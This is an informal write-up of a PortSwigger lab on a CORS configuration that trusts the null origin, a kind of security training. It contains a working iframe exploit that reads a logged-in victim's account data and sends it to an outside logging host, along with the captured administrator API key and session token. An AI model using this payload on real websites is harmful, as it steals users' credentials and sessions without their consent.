# CORS vulnerability with trusted null origin

## This website has an insecure [CORS](https://portswigger.net/web-security/cors) configuration in that it trusts the "null" origin.

## To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

## You can log in to your own account using the following credentials: `wiener:peter`

### step1

login with credentials
go to burpsuite and see history
like the lab1
account detils
add origin: null
it will response
Access-Control-Allow-Origin: null

### step2

use this script

```html
<iframe
  sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script> 
	var req = new XMLHttpRequest(); 
	req.onload = reqListener; 
	req.open('get','vulnerable-website.com/sensitive-victim-data',true); 
	req.withCredentials = true; 
	req.send(); 

	function reqListener() { 
	location='malicious-website.com/log?key='+this.responseText; 
	}; 
</script>"
></iframe>
```

change with la credentials

```html
<iframe
  sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script> 
	var req = new XMLHttpRequest(); 
	req.onload = reqListener; 
	req.open('get','https://0a0000f304ad0b4881dc70fa00fb0055.web-security-academy.net/accountDetails',true); 
	req.withCredentials = true; 
	req.send(); 

	function reqListener() { 
	location='https://exploit-0a72000b04740b5381246f72014b006f.exploit-server.net//log?key='+this.responseText; 
	}; 
</script>"
></iframe>
```

deliver to victim and go to /log

```javascript
%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22znykYDb92N2mZpPTZgqr3E1RmspfMdtx%22,%20%20%22sessions%22:%20[%20%20%20%20%22aaBpaigppio0v0fLpmXC67hxZodS1og4%22%20%20
```

decode

```javascript
  "username": "administrator",  "email": "",  "apikey": "znykYDb92N2mZpPTZgqr3E1RmspfMdtx",  "sessions": [    "aaBpaigppio0v0fLpmXC67hxZodS1og4"
```

sumit and lab solve
